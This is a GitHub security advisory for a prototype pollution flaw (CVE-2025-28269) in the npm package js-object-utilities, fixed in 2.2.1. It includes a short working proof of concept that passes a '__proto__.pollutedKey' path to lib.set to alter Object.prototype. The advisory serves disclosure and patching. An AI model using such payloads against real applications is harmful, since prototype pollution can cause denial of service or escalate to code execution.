# [H] js-object-utilities Vulnerable to Prototype Pollution

## Summary
Severity: High
Advisory: GHSA-hpqf-m68j-2pfx
CVE: CVE-2025-28269
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-04-07
Source: https://github.com/advisories/GHSA-hpqf-m68j-2pfx
Type: github-advisory

## Affected
- npm: `js-object-utilities` — affected >=0 <2.2.1

## Details
**Vulnerability type:**
Prototype Pollution

**Affected Package:**
* Product: js-object-utilities
* Version: 2.2.0

**Remedy:**

Update package to version 2.2.1.

**Vulnerability Location(s):**
```js
at module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)
```

**Description:**

The latest version of `js-object-utilities (2.2.0)`, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) `lib.set`. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.

Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.

**PoC:**

```bash
// install the package with the latest version
~$ npm install js-object-utilities@2.2.0
// run the script mentioned below 
~$ node poc.js
//The expected output (if the code still vulnerable) is below. 
// Note that the output may slightly differs from function to another.
Before Attack:  {}
After Attack:  {"pollutedKey":123}
```

```js
// poc.js
(async () => {
    const lib = await import('js-object-utilities');
    var someObj = {}
    console.log("Before Attack: ", JSON.stringify({}.__proto__));
    try {
        // for multiple functions, uncomment only one for each execution.
        Reflect.apply(lib.set, {}, [someObj, "__proto__.pollutedKey", 123]);
    } catch (e) { }
    console.log("After Attack: ", JSON.stringify({}.__proto__));
    delete Object.prototype.pollutedKey;
})();
```

**Reporter Credit:**

Tariq Hawis

## References
- https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx
- https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7
- https://github.com/rrainn/js-object-utilities
